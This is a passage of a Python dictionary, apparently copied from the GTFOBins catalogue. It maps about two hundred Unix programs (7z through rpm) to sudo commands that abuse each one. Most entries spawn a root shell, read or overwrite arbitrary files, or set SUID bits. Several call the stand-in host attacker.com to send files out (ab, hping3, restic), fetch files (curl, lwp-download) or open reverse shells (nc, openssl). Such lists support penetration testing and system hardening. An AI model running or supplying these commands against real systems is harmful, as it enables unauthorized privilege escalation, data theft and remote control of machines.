sudo_bins = {
    "7z": [
        {
            "LFILE=file_to_read sudo 7z a -ttar -an -so $LFILE | 7z e -ttar -si -so"
        }
    ],
    "aa-exec": [
        {
            "sudo aa-exec /bin/sh"
        }
    ],
    "ab": [
        {
            "URL=http://attacker.com/ LFILE=file_to_send sudo ab -p $LFILE $URL",
        }
    ],
    "alpine": [
        {
            "LFILE=file_to_read sudo alpine -F \"$LFILE\""
        }
    ],
    "ansible-playbook": [
        {
            "TF=$(mktemp) && echo '[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]' >$TF && sudo ansible-playbook $TF"
        }
    ],
    "ansible-test": [
        {
            "sudo ansible-test shell"
        }
    ],
    "aoss": [
        {
            "sudo aoss /bin/sh"
        }
    ],
    "apache2ctl": [
        {
            "LFILE=file_to_read sudo apache2ctl -c \"Include $LFILE\" -k stop"
        }
    ],
    "apt": [
        {
            "sudo apt changelog apt && /bin/sh",
        },
        {
            "TF=$(mktemp) && echo 'Dpkg::Pre-Invoke {\"/bin/sh;false\"}' > $TF && sudo apt install -c $TF sl",
        },
        {
            "sudo apt update -o APT::Update::Pre-Invoke::=/bin/sh",
        }
    ],
    "apt-get": [
        {
            "sudo apt-get changelog apt && /bin/sh",
        },
        {
            "TF=$(mktemp) && echo 'Dpkg::Pre-Invoke {\"/bin/sh;false\"}' > $TF && sudo apt-get install -c $TF sl",
        },
        {
            "sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh",
        }
    ],
    "ar": [
        {
            "TF=$(mktemp -u) LFILE=file_to_read sudo ar r \"$TF\" \"$LFILE\" && cat \"$TF\""
        }
    ],
    "aria2c": [
        {
            "URL=http://attacker.com/ && COMMAND='id' && TF=$(mktemp) && echo \"$COMMAND\" > $TF && chmod +x $TF && sudo aria2c --on-download-error=$TF $URL"
        }
    ],
    "arj": [
        {
            "TF=$(mktemp -d) && LFILE=file_to_write && LDIR=where_to_write && echo DATA >\"$TF/$LFILE\" && arj a \"$TF/a\" \"$TF/$LFILE\" && sudo arj e \"$TF/a\" $LDIR",
        }
    ],
    "arp": [
        {
            "LFILE=file_to_read && sudo arp -v -f \"$LFILE\""
        }
    ],
    "as": [
        {
            "LFILE=file_to_read && sudo as @$LFILE"
        }
    ],
    "ascii-xfr": [
        {
            "LFILE=file_to_read && sudo ascii-xfr -ns \"$LFILE\""
        }
    ],
    "ascii85": [
        {
            "LFILE=file_to_read && sudo ascii85 \"$LFILE\" | ascii85 --decode"
        }
    ],
    "ash": [
        {
            "sudo ash"
        }
    ],
    "aspell": [
        {
            "LFILE=file_to_read && sudo aspell -c \"$LFILE\""
        }
    ],
    "at": [
        {
            "echo \"/bin/sh <$(tty) >$(tty) 2>$(tty)\" | sudo at now; tail -f /dev/null"
        }
    ],
    "atobm": [
        {
            "LFILE=file_to_read && sudo atobm $LFILE 2>&1 | awk -F \"'\" '{printf \"%s\", $2}'"
        }
    ],
    "awk": [
        {
            "sudo awk 'BEGIN {system(\"/bin/sh\")}'"
        }
    ],
    "aws": [
        {
            "sudo aws help && /bin/sh",
        }
    ],
    "base32": [
        {
            "LFILE=file_to_read && sudo base32 \"$LFILE\" | base32 --decode"
        }
    ],
    "base58": [
        {
            "LFILE=file_to_read && sudo base58 \"$LFILE\" | base58 --decode"
        }
    ],
    "base64": [
        {
            "LFILE=file_to_read && sudo base64 \"$LFILE\" | base64 --decode"
        }
    ],
    "basenc": [
        {
            "LFILE=file_to_read && sudo basenc --base64 $LFILE | basenc -d --base64"
        }
    ],
    "basez": [
        {
            "LFILE=file_to_read && sudo basez \"$LFILE\" | basez --decode"
        }
    ],
    "bash": [
        {
            "sudo bash"
        }
    ],
    "batcat": [
        {
            "sudo batcat --paging always /etc/profile && /bin/sh"
        }
    ],
    "bc": [
        {
            "LFILE=file_to_read && sudo bc -s $LFILE && quit"
        }
    ],
    "bconsole": [
        {
            "sudo bconsole && @exec /bin/sh"
        }
    ],
    "bpftrace": [
        {
            "sudo bpftrace -e 'BEGIN {system(\"/bin/sh\");exit()}'"
        },
        {
            "TF=$(mktemp) && echo 'BEGIN {system(\"/bin/sh\");exit()}' >$TF && sudo bpftrace $TF"
        },
        {
            "sudo bpftrace -c /bin/sh -e 'END {exit()}'"
        }
    ],
    "bridge": [
        {
            "LFILE=file_to_read && sudo bridge -b \"$LFILE\""
        }
    ],
    "bundle": [
        {
            "sudo bundle help && /bin/sh",
        }
    ],
    "bundler": [
        {
            "sudo bundler help && /bin/sh",
        }
    ],
    "busctl": [
        {
            "sudo busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=/bin/sh,argv1=-c,argv2='/bin/sh -i 0<&2 1>&2'"
        }
    ],
    "busybox": [
        {
            "sudo busybox sh"
        }
    ],
    "byebug": [
        {
            "TF=$(mktemp) && echo 'system(\"/bin/sh\")' > $TF && sudo byebug $TF && continue"
        }
    ],
    "bzip2": [
        {
            "LFILE=file_to_read && sudo bzip2 -c $LFILE | bzip2 -d"
        }
    ],
    "c89": [
        {
            "sudo c89 -wrapper /bin/sh,-s ."
        }
    ],
    "c99": [
        {
            "sudo c99 -wrapper /bin/sh,-s ."
        }
    ],
    "cabal": [
        {
            "sudo cabal exec -- /bin/sh"
        }
    ],
    "capsh": [
        {
            "sudo capsh --"
        }
    ],
    "cat": [
        {
            "LFILE=file_to_read && sudo cat \"$LFILE\""
        }
    ],
    "cdist": [
        {
            "sudo cdist shell -s /bin/sh"
        }
    ],
    "certbot": [
        {
            "TF=$(mktemp -d) && sudo certbot certonly -n -d x --standalone --dry-run --agree-tos --email x --logs-dir $TF --work-dir $TF --config-dir $TF --pre-hook '/bin/sh 1>&0 2>&0'"
        }
    ],
    "check_by_ssh": [
        {
            "sudo check_by_ssh -o \"ProxyCommand /bin/sh -i <$(tty) |& tee $(tty)\" -H localhost -C xx",
        }
    ],
    "check_cups": [
        {
            "LFILE=file_to_read && sudo check_cups --extra-opts=@$LFILE"
        }
    ],
    "check_log": [
        {
            "LFILE=file_to_write && INPUT=input_file && sudo check_log -F $INPUT -O $LFILE"
        }
    ],
    "check_memory": [
        {
            "LFILE=file_to_read && sudo check_memory --extra-opts=@$LFILE"
        }
    ],
    "check_raid": [
        {
            "LFILE=file_to_read && sudo check_raid --extra-opts=@$LFILE"
        }
    ],
    "check_ssl_cert": [
        {
            "COMMAND=id && OUTPUT=output_file && TF=$(mktemp) && echo \"$COMMAND | tee $OUTPUT\" > $TF && chmod +x $TF && umask 022 && check_ssl_cert --curl-bin $TF -H example.net && cat $OUTPUT",
        }
    ],
    "check_statusfile": [
        {
            "LFILE=file_to_read && sudo check_statusfile $LFILE"
        }
    ],
    "chmod": [
        {
            "LFILE=file_to_change && sudo chmod 6777 $LFILE"
        }
    ],
    "choom": [
        {
            "sudo choom -n 0 /bin/sh"
        }
    ],
    "chown": [
        {
            "LFILE=file_to_change && sudo chown $(id -un):$(id -gn) $LFILE"
        }
    ],
    "chroot": [
        {
            "sudo chroot /"
        }
    ],
    "clamscan": [
        {
            "LFILE=file_to_read && TF=$(mktemp -d) && touch $TF/empty.yara && sudo clamscan --no-summary -d $TF -f $LFILE 2>&1 | sed -nE 's/^(.*): No such file or directory$/\\1/p'"
        }
    ],
    "cmp": [
        {
            "LFILE=file_to_read && sudo cmp $LFILE /dev/zero -b -l"
        }
    ],
    "cobc": [
        {
            "TF=$(mktemp -d) && echo 'CALL \"SYSTEM\" USING \"/bin/sh\".' > $TF/x && sudo cobc -xFj --frelax-syntax-checks $TF/x"
        }
    ],
    "column": [
        {
            "LFILE=file_to_read && sudo column $LFILE"
        }
    ],
    "comm": [
        {
            "LFILE=file_to_read && sudo comm $LFILE /dev/null 2>/dev/null"
        }
    ],
    "composer": [
        {
            "TF=$(mktemp -d) && echo '{\"scripts\":{\"x\":\"/bin/sh -i 0<&3 1>&3 2>&3\"}}' >$TF/composer.json && sudo composer --working-dir=$TF run-script x"
        }
    ],
    "cowsay": [
        {
            "TF=$(mktemp) && echo 'exec \"/bin/sh\";' >$TF && sudo cowsay -f $TF x"
        }
    ],
    "cowthink": [
        {
            "TF=$(mktemp) && echo 'exec \"/bin/sh\";' >$TF && sudo cowthink -f $TF x"
        }
    ],
    "cp": [
        {
            "LFILE=file_to_write && echo \"DATA\" | sudo cp /dev/stdin \"$LFILE\""
        },
        {
            "LFILE=file_to_write && TF=$(mktemp) && echo \"DATA\" > $TF && sudo cp $TF $LFILE",
        },
        {
            "sudo cp /bin/sh /bin/cp && sudo cp",
        }
    ],
    "cpan": [
        {
            "sudo cpan && ! exec '/bin/bash'"
        }
    ],
    "cpio": [
        {
            "echo '/bin/sh </dev/tty >/dev/tty' >localhost && sudo cpio -o --rsh-command /bin/sh -F localhost:"
        },
        {
            "LFILE=file_to_read && TF=$(mktemp -d) && echo \"$LFILE\" | sudo cpio -R $UID -dp $TF && cat \"$TF/$LFILE\"",
        },
        {
            "LFILE=file_to_write && LDIR=where_to_write && echo DATA >$LFILE && echo $LFILE | sudo cpio -R 0:0 -p $LDIR",
        }
    ],
    "cpulimit": [
        {
            "sudo cpulimit -l 100 -f /bin/sh"
        }
    ],
    "crash": [
        {
            "sudo crash -h && !sh",
        }
    ],
    "crontab": [
        {
            "sudo crontab -e",
        }
    ],
    "csh": [
        {
            "sudo csh"
        }
    ],
    "csplit": [
        {
            "LFILE=file_to_read && csplit $LFILE 1 && cat xx01"
        }
    ],
    "csvtool": [
        {
            "sudo csvtool call '/bin/sh;false' /etc/passwd"
        }
    ],
    "cupsfilter": [
        {
            "LFILE=file_to_read && sudo cupsfilter -i application/octet-stream -m application/octet-stream $LFILE"
        }
    ],
    "curl": [
        {
            "URL=http://attacker.com/file_to_get && LFILE=file_to_save && sudo curl $URL -o $LFILE",
        }
    ],
    "cut": [
        {
            "LFILE=file_to_read && sudo cut -d \"\" -f1 \"$LFILE\""
        }
    ],
    "dash": [
        {
            "sudo dash"
        }
    ],
    "date": [
        {
            "LFILE=file_to_read && sudo date -f $LFILE"
        }
    ],
    "dc": [
        {
            "sudo dc -e '!/bin/sh'"
        }
    ],
    "dd": [
        {
            "LFILE=file_to_write && echo \"data\" | sudo dd of=$LFILE"
        }
    ],
    "debugfs": [
        {
            "sudo debugfs && /bin/sh"
        }
    ],
    "dialog": [
        {
            "LFILE=file_to_read && sudo dialog --textbox \"$LFILE\" 0 0"
        }
    ],
    "diff": [
        {
            "LFILE=file_to_read && sudo diff --line-format=%L /dev/null $LFILE"
        }
    ],
    "dig": [
        {
            "LFILE=file_to_read && sudo dig -f $LFILE"
        }
    ],
    "distcc": [
        {
            "sudo distcc /bin/sh"
        }
    ],
    "dmesg": [
        {
            "sudo dmesg -H && /bin/sh",
        }
    ],
    "dmidecode": [
        {
            "LFILE=file_to_write && sudo dmidecode --no-sysfs -d x.dmi --dump-bin \"$LFILE\"",
        }
    ],
    "dmsetup": [
        {
            "sudo dmsetup create base <<EOF && 0 3534848 linear /dev/loop0 94208 && EOF && sudo dmsetup ls --exec '/bin/sh -s'"
        }
    ],
    "dnf": [
        {
            "sudo dnf install -y x-1.0-1.noarch.rpm",
        }
    ],
    "docker": [
        {
            "sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
        }
    ],
    "dosbox": [
        {
            "LFILE='\\path\\to\\file_to_write' && sudo dosbox -c 'mount c /' -c \"echo DATA >c:$LFILE\" -c exit",
        }
    ],
    "dotnet": [
        {
            "sudo dotnet fsi && System.Diagnostics.Process.Start(\"/bin/sh\").WaitForExit();;"
        }
    ],
    "dpkg": [
        {
            "sudo dpkg -l && /bin/sh",
        },
        {
            "sudo dpkg -i x_1.0_all.deb",
        }
    ],
    "dstat": [
        {
            "echo 'import os; os.execv(\"/bin/sh\", [\"sh\"])' >/usr/local/share/dstat/dstat_xxx.py && sudo dstat --xxx"
        }
    ],
    "dvips": [
        {
            "tex '\\special{psfile=\"`/bin/sh 1>&0\"}\\end' && sudo dvips -R0 texput.dvi"
        }
    ],
    "easy_install": [
        {
            "TF=$(mktemp -d) && echo \"import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')\" > $TF/setup.py && sudo easy_install $TF"
        }
    ],
    "eb": [
        {
            "sudo eb logs && /bin/sh"
        }
    ],
    "ed": [
        {
            "sudo ed && /bin/sh"
        }
    ],
    "efax": [
        {
            "LFILE=file_to_read && sudo efax -d \"$LFILE\""
        }
    ],
    "elvish": [
        {
            "sudo elvish"
        }
    ],
    "emacs": [
        {
            "sudo emacs -Q -nw --eval '(term \"/bin/sh\")'"
        }
    ],
    "enscript": [
        {
            "sudo enscript /dev/null -qo /dev/null -I '/bin/sh >&2'"
        }
    ],
    "env": [
        {
            "sudo env /bin/sh"
        }
    ],
    "eqn": [
        {
            "LFILE=file_to_read && sudo eqn \"$LFILE\""
        }
    ],
    "espeak": [
        {
            "LFILE=file_to_read && sudo espeak -qXf \"$LFILE\""
        }
    ],
    "ex": [
        {
            "sudo ex && /bin/sh"
        }
    ],
    "exiftool": [
        {
            "LFILE=file_to_write && INPUT=input_file && sudo exiftool -filename=$LFILE $INPUT"
        }
    ],
    "expand": [
        {
            "LFILE=file_to_read && sudo expand \"$LFILE\""
        }
    ],
    "expect": [
        {
            "sudo expect -c 'spawn /bin/sh;interact'"
        }
    ],
    "facter": [
        {
            "TF=$(mktemp -d) && echo 'exec(\"/bin/sh\")' > $TF/x.rb && sudo FACTERLIB=$TF facter"
        }
    ],
    "file": [
        {
            "LFILE=file_to_read && sudo file -f $LFILE",
        }
    ],
    "find": [
        {
            "sudo find . -exec /bin/sh \\; -quit"
        }
    ],
    "fish": [
        {
            "sudo fish"
        }
    ],
    "flock": [
        {
            "sudo flock -u / /bin/sh"
        }
    ],
    "fmt": [
        {
            "LFILE=file_to_read && sudo fmt -999 \"$LFILE\"",
        }
    ],
    "fold": [
        {
            "LFILE=file_to_read && sudo fold -w99999999 \"$LFILE\""
        }
    ],
    "fping": [
        {
            "LFILE=file_to_read && sudo fping -f $LFILE"
        }
    ],
    "ftp": [
        {
            "sudo ftp && /bin/sh"
        }
    ],
    "gawk": [
        {
            "sudo gawk 'BEGIN {system(\"/bin/sh\")}'"
        }
    ],
    "gcc": [
        {
            "sudo gcc -wrapper /bin/sh,-s ."
        }
    ],
    "gcloud": [
        {
            "sudo gcloud help && /bin/sh",
        }
    ],
    "gcore": [
        {
            "sudo gcore $PID"
        }
    ],
    "gdb": [
        {
            "sudo gdb -nx -ex '!sh' -ex quit"
        }
    ],
    "gem": [
        {
            "sudo gem open -e \"/bin/sh -c /bin/sh\" rdoc",
        }
    ],
    "genie": [
        {
            "sudo genie -c '/bin/sh'"
        }
    ],
    "genisoimage": [
        {
            "LFILE=file_to_read && sudo genisoimage -q -o - \"$LFILE\""
        }
    ],
    "ghc": [
        {
            "sudo ghc -e 'System.Process.callCommand \"/bin/sh\"'"
        }
    ],
    "ghci": [
        {
            "sudo ghci && System.Process.callCommand \"/bin/sh\""
        }
    ],
    "gimp": [
        {
            "sudo gimp -idf --batch-interpreter=python-fu-eval -b 'import os; os.system(\"sh\")'"
        }
    ],
    "ginsh": [
        {
            "sudo ginsh && /bin/sh"
        }
    ],
    "git": [
        {
            "sudo PAGER='sh -c \"exec sh 0<&1\"' git -p help"
        },
        {
            "sudo git -p help config && /bin/sh",
        },
        {
            "sudo git branch --help config && /bin/sh",
        },
        {
            "TF=$(mktemp -d) && git init \"$TF\" && echo 'exec /bin/sh 0<&2 1>&2' >\"$TF/.git/hooks/pre-commit.sample\" && mv \"$TF/.git/hooks/pre-commit.sample\" \"$TF/.git/hooks/pre-commit\" && sudo git -C \"$TF\" commit --allow-empty -m x",
        },
        {
            "TF=$(mktemp -d) && ln -s /bin/sh \"$TF/git-x\" && sudo git \"--exec-path=$TF\" x"
        }
    ],
    "grc": [
        {
            "sudo grc --pty /bin/sh"
        }
    ],
    "grep": [
        {
            "LFILE=file_to_read && sudo grep '' $LFILE"
        }
    ],
    "gtester": [
        {
            "TF=$(mktemp) && echo '#!/bin/sh' > $TF && echo 'exec /bin/sh 0<&1' >> $TF && chmod +x $TF && sudo gtester -q $TF"
        }
    ],
    "gzip": [
        {
            "LFILE=file_to_read && sudo gzip -f $LFILE -t"
        }
    ],
    "hd": [
        {
            "LFILE=file_to_read && sudo hd \"$LFILE\""
        }
    ],
    "head": [
        {
            "LFILE=file_to_read && sudo head -c1G \"$LFILE\""
        }
    ],
    "hexdump": [
        {
            "LFILE=file_to_read && sudo hexdump -C \"$LFILE\""
        }
    ],
    "highlight": [
        {
            "LFILE=file_to_read && sudo highlight --no-doc --failsafe \"$LFILE\""
        }
    ],
    "hping3": [
        {
            "sudo hping3 && /bin/sh"
        },
        {
            "RHOST=attacker.com && LFILE=file_to_read && sudo hping3 \"$RHOST\" --icmp --data 500 --sign xxx --file \"$LFILE\"",
        }
    ],
    "iconv": [
        {
            "LFILE=file_to_read && ./iconv -f 8859_1 -t 8859_1 \"$LFILE\""
        }
    ],
    "iftop": [
        {
            "sudo iftop && /bin/sh"
        }
    ],
    "install": [
        {
            "LFILE=file_to_change && TF=$(mktemp) && sudo install -m 6777 $LFILE $TF"
        }
    ],
    "ionice": [
        {
            "sudo ionice /bin/sh"
        }
    ],
    "ip": [
        {
            "LFILE=file_to_read && sudo ip -force -batch \"$LFILE\""
        },
        {
            "sudo ip netns add foo && sudo ip netns exec foo /bin/sh && sudo ip netns delete foo",
        },
        {
            "sudo ip netns add foo && sudo ip netns exec foo /bin/ln -s /proc/1/ns/net /var/run/netns/bar && sudo ip netns exec bar /bin/sh && sudo ip netns delete foo && sudo ip netns delete bar",
        }
    ],
    "irb": [
        {
            "sudo irb && exec '/bin/bash'"
        }
    ],
    "ispell": [
        {
            "sudo ispell /etc/passwd && /bin/sh"
        }
    ],
    "jjs": [
        {
            "echo \"Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -c \\$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)').waitFor()\" | sudo jjs"
        }
    ],
    "joe": [
        {
            "sudo joe && ^K /bin/sh"
        }
    ],
    "join": [
        {
            "LFILE=file_to_read && sudo join -a 2 /dev/null $LFILE"
        }
    ],
    "journalctl": [
        {
            "sudo journalctl && /bin/sh"
        }
    ],
    "jq": [
        {
            "LFILE=file_to_read && sudo jq -Rr . \"$LFILE\""
        }
    ],
    "jrunscript": [
        {
            "sudo jrunscript -e \"exec('/bin/sh -c \\$@|sh _ echo sh <$(tty) >$(tty) 2>$(tty)')\""
        }
    ],
    "jtag": [
        {
            "sudo jtag --interactive && shell /bin/sh"
        }
    ],
    "julia": [
        {
            "sudo julia -e 'run(`/bin/sh`)'"
        }
    ],
    "knife": [
        {
            "sudo knife exec -E 'exec \"/bin/sh\"'"
        }
    ],
    "ksh": [
        {
            "sudo ksh"
        }
    ],
    "ksshell": [
        {
            "LFILE=file_to_read && sudo ksshell -i $LFILE"
        }
    ],
    "ksu": [
        {
            "sudo ksu -q -e /bin/sh"
        }
    ],
    "kubectl": [
        {
            "LFILE=dir_to_serve && sudo kubectl proxy --address=0.0.0.0 --port=4444 --www=$LFILE --www-prefix=/x/"
        }
    ],
    "latex": [
        {
            "sudo latex '\\documentclass{article}\\usepackage{verbatim}\\begin{document}\\verbatiminput{file_to_read}\\end{document}' && strings article.dvi",
        },
        {
            "sudo latex --shell-escape '\\documentclass{article}\\begin{document}\\immediate\\write18{/bin/sh}\\end{document}'"
        }
    ],
    "latexmk": [
        {
            "sudo latexmk -e 'exec \"/bin/sh\";'"
        }
    ],
    "ld.so": [
        {
            "sudo /lib/ld.so /bin/sh"
        }
    ],
    "ldconfig": [
        {
            "TF=$(mktemp -d) && echo \"$TF\" > \"$TF/conf\" && # move malicious libraries in $TF && sudo ldconfig -f \"$TF/conf\"",
        }
    ],
    "less": [
        {
            "sudo less /etc/profile && /bin/sh"
        }
    ],
    "lftp": [
        {
            "sudo lftp -c '!/bin/sh'"
        }
    ],
    "links": [
        {
            "LFILE=file_to_read && sudo links \"$LFILE\""
        }
    ],
    "ln": [
        {
            "sudo ln -fs /bin/sh /bin/ln && sudo ln"
        }
    ],
    "loginctl": [
        {
            "sudo loginctl user-status && /bin/sh"
        }
    ],
    "logsave": [
        {
            "sudo logsave /dev/null /bin/sh -i"
        }
    ],
    "look": [
        {
            "LFILE=file_to_read && sudo look '' \"$LFILE\""
        }
    ],
    "ltrace": [
        {
            "sudo ltrace -b -L /bin/sh"
        }
    ],
    "lua": [
        {
            "sudo lua -e 'os.execute(\"/bin/sh\")'"
        }
    ],
    "lualatex": [
        {
            "sudo lualatex -shell-escape '\\documentclass{article}\\begin{document}\\directlua{os.execute(\"/bin/sh\")}\\end{document}'"
        }
    ],
    "luatex": [
        {
            "sudo luatex -shell-escape '\\directlua{os.execute(\"/bin/sh\")}\\end'"
        }
    ],
    "lwp-download": [
        {
            "URL=http://attacker.com/file_to_get && LFILE=file_to_save && sudo lwp-download $URL $LFILE"
        }
    ],
    "lwp-request": [
        {
            "LFILE=file_to_read && sudo lwp-request \"file://$LFILE\""
        }
    ],
    "mail": [
        {
            "sudo mail --exec='!/bin/sh'",
        }
    ],
    "make": [
        {
            "COMMAND='/bin/sh' && sudo make -s --eval=$'x:\ && \\t-'\"$COMMAND\""
        }
    ],
    "man": [
        {
            "sudo man man && /bin/sh"
        }
    ],
    "mawk": [
        {
            "sudo mawk 'BEGIN {system(\"/bin/sh\")}'"
        }
    ],
    "minicom": [
        {
            "sudo minicom -D /dev/null",
        }
    ],
    "more": [
        {
            "TERM= sudo more /etc/profile && /bin/sh"
        }
    ],
    "mosquitto": [
        {
            "LFILE=file_to_read && sudo mosquitto -c \"$LFILE\""
        }
    ],
    "mount": [
        {
            "sudo mount -o bind /bin/sh /bin/mount && sudo mount",
        }
    ],
    "msfconsole": [
        {
            "sudo msfconsole && msf6 > irb && >> system(\"/bin/sh\")"
        }
    ],
    "msgattrib": [
        {
            "LFILE=file_to_read && sudo msgattrib -P $LFILE"
        }
    ],
    "msgcat": [
        {
            "LFILE=file_to_read && sudo msgcat -P $LFILE"
        }
    ],
    "msgconv": [
        {
            "LFILE=file_to_read && sudo msgconv -P $LFILE"
        }
    ],
    "msgfilter": [
        {
            "echo x | sudo msgfilter -P /bin/sh -c '/bin/sh 0<&2 1>&2; kill $PPID'",
        }
    ],
    "msgmerge": [
        {
            "LFILE=file_to_read && sudo msgmerge -P $LFILE /dev/null"
        }
    ],
    "msguniq": [
        {
            "LFILE=file_to_read && sudo msguniq -P $LFILE"
        }
    ],
    "mtr": [
        {
            "LFILE=file_to_read && sudo mtr --raw -F \"$LFILE\""
        }
    ],
    "multitime": [
        {
            "sudo multitime /bin/sh"
        }
    ],
    "mv": [
        {
            "LFILE=file_to_write && TF=$(mktemp) && echo \"DATA\" > $TF && sudo mv $TF $LFILE"
        }
    ],
    "mysql": [
        {
            "sudo mysql -e '\\! /bin/sh'"
        }
    ],
    "nano": [
        {
            "sudo nano && ^R^X && reset; sh 1>&0 2>&0"
        }
    ],
    "nasm": [
        {
            "LFILE=file_to_read && sudo nasm -@ $LFILE"
        }
    ],
    "nawk": [
        {
            "sudo nawk 'BEGIN {system(\"/bin/sh\")}'"
        }
    ],
    "nc": [
        {
            "RHOST=attacker.com && RPORT=12345 && sudo nc -e /bin/sh $RHOST $RPORT",
        }
    ],
    "ncdu": [
        {
            "sudo ncdu && b"
        }
    ],
    "ncftp": [
        {
            "sudo ncftp && /bin/sh"
        }
    ],
    "neofetch": [
        {
            "TF=$(mktemp) && echo 'exec /bin/sh' >$TF && sudo neofetch --config $TF"
        }
    ],
    "nft": [
        {
            "LFILE=file_to_read && sudo nft -f \"$LFILE\""
        }
    ],
    "nice": [
        {
            "sudo nice /bin/sh"
        }
    ],
    "nl": [
        {
            "LFILE=file_to_read && sudo nl -bn -w1 -s '' $LFILE"
        }
    ],
    "nm": [
        {
            "LFILE=file_to_read && sudo nm @$LFILE"
        }
    ],
    "nmap": [
        {
            "TF=$(mktemp) && echo 'os.execute(\"/bin/sh\")' > $TF && sudo nmap --script=$TF",
        },
        {
            "sudo nmap --interactive && nmap> !sh",
        }
    ],
    "node": [
        {
            "sudo node -e 'require(\"child_process\").spawn(\"/bin/sh\", {stdio: [0, 1, 2]})'"
        }
    ],
    "nohup": [
        {
            "sudo nohup /bin/sh -c \"sh <$(tty) >$(tty) 2>$(tty)\""
        }
    ],
    "npm": [
        {
            "TF=$(mktemp -d) && echo '{\"scripts\": {\"preinstall\": \"/bin/sh\"}}' > $TF/package.json && sudo npm -C $TF --unsafe-perm i",
        }
    ],
    "nroff": [
        {
            "TF=$(mktemp -d) && echo '#!/bin/sh' > $TF/groff && echo '/bin/sh' >> $TF/groff && chmod +x $TF/groff && sudo GROFF_BIN_PATH=$TF nroff"
        }
    ],
    "nsenter": [
        {
            "sudo nsenter /bin/sh"
        }
    ],
    "ntpdate": [
        {
            "LFILE=file_to_read && sudo ntpdate -a x -k $LFILE -d localhost"
        }
    ],
    "octave": [
        {
            "sudo octave-cli --eval 'system(\"/bin/sh\")'"
        }
    ],
    "od": [
        {
            "LFILE=file_to_read && sudo od -An -c -w9999 \"$LFILE\""
        }
    ],
    "openssl": [
        {
            "RHOST=attacker.com && RPORT=12345 && mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | sudo openssl s_client -quiet -connect $RHOST:$RPORT > /tmp/s; rm /tmp/s",
        }
    ],
    "openvpn": [
        {
            "sudo openvpn --dev null --script-security 2 --up '/bin/sh -c sh'"
        },
        {
            "LFILE=file_to_read && sudo openvpn --config \"$LFILE\"",
        }
    ],
    "openvt": [
        {
            "COMMAND=id && TF=$(mktemp -u) && sudo openvt -- sh -c \"$COMMAND >$TF 2>&1\" && cat $TF",
        }
    ],
    "opkg": [
        {
            "sudo opkg install x_1.0_all.deb",
        }
    ],
    "pandoc": [
        {
            "TF=$(mktemp) && echo 'os.execute(\"/bin/sh\")' >$TF && sudo pandoc -L $TF /dev/null",
        }
    ],
    "paste": [
        {
            "LFILE=file_to_read && sudo paste $LFILE"
        }
    ],
    "pdb": [
        {
            "TF=$(mktemp) && echo 'import os; os.system(\"/bin/sh\")' > $TF && sudo pdb $TF && cont"
        }
    ],
    "pdflatex": [
        {
            "sudo pdflatex '\\documentclass{article}\\usepackage{verbatim}\\begin{document}\\verbatiminput{file_to_read}\\end{document}' && pdftotext article.pdf -",
        },
        {
            "sudo pdflatex --shell-escape '\\documentclass{article}\\begin{document}\\immediate\\write18{/bin/sh}\\end{document}'"
        }
    ],
    "pdftex": [
        {
            "sudo pdftex --shell-escape '\\write18{/bin/sh}\\end'"
        }
    ],
    "perf": [
        {
            "sudo perf stat /bin/sh"
        }
    ],
    "perl": [
        {
            "sudo perl -e 'exec \"/bin/sh\";'"
        }
    ],
    "perlbug": [
        {
            "sudo perlbug -s 'x x x' -r x -c x -e 'exec /bin/sh;'"
        }
    ],
    "pexec": [
        {
            "sudo pexec /bin/sh"
        }
    ],
    "pg": [
        {
            "sudo pg /etc/profile && /bin/sh"
        }
    ],
    "php": [
        {
            "CMD=\"/bin/sh\" && sudo php -r \"system('$CMD');\""
        }
    ],
    "pic": [
        {
            "sudo pic -U && .PS && sh X sh X"
        }
    ],
    "pico": [
        {
            "sudo pico && ^R^X && reset; sh 1>&0 2>&0"
        }
    ],
    "pidstat": [
        {
            "COMMAND=id && sudo pidstat -e $COMMAND"
        }
    ],
    "pip": [
        {
            "TF=$(mktemp -d) && echo \"import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')\" > $TF/setup.py && sudo pip install $TF"
        }
    ],
    "pkexec": [
        {
            "sudo pkexec /bin/sh"
        }
    ],
    "pkg": [
        {
            "sudo pkg install -y --no-repo-update ./x-1.0.txz",
        }
    ],
    "posh": [
        {
            "sudo posh"
        }
    ],
    "pr": [
        {
            "LFILE=file_to_read && pr -T $LFILE"
        }
    ],
    "pry": [
        {
            "sudo pry && system(\"/bin/sh\")"
        }
    ],
    "psftp": [
        {
            "sudo psftp && /bin/sh"
        }
    ],
    "psql": [
        {
            "psql && \\? && /bin/sh"
        }
    ],
    "ptx": [
        {
            "LFILE=file_to_read && sudo ptx -w 5000 \"$LFILE\""
        }
    ],
    "puppet": [
        {
            "sudo puppet apply -e \"exec { '/bin/sh -c \\\"exec sh -i <$(tty) >$(tty) 2>$(tty)\\\"': }\""
        }
    ],
    "pwsh": [
        {
            "sudo pwsh"
        }
    ],
    "python": [
        {
            "sudo python -c 'import os; os.system(\"/bin/sh\")'"
        }
    ],
    "rake": [
        {
            "sudo rake -p '`/bin/sh 1>&0`'"
        }
    ],
    "rc": [
        {
            "sudo rc -c '/bin/sh'"
        }
    ],
    "readelf": [
        {
            "LFILE=file_to_read && sudo readelf -a @$LFILE"
        }
    ],
    "red": [
        {
            "sudo red file_to_write && a && DATA && . && w && q"
        }
    ],
    "redcarpet": [
        {
            "LFILE=file_to_read && sudo redcarpet \"$LFILE\""
        }
    ],
    "restic": [
        {
            "RHOST=attacker.com && RPORT=12345 && LFILE=file_or_dir_to_get && NAME=backup_name && sudo restic backup -r \"rest:http://$RHOST:$RPORT/$NAME\" \"$LFILE\""
        }
    ],
    "rev": [
        {
            "LFILE=file_to_read && sudo rev $LFILE | rev"
        }
    ],
    "rlwrap": [
        {
            "sudo rlwrap /bin/sh"
        }
    ],
    "rpm": [
        {
            "sudo rpm --eval '%{lua:os.execute(\"/bin/sh\")}'"
        },
        {
            "sudo rpm -ivh x-1.0-1.noarch.rpm",
        }
    ],
    "rpmdb": [
        {
            "sudo rpmdb --eval '%(/bin/sh 1>&2)'"
        }
    ],
    "rpmquery": [
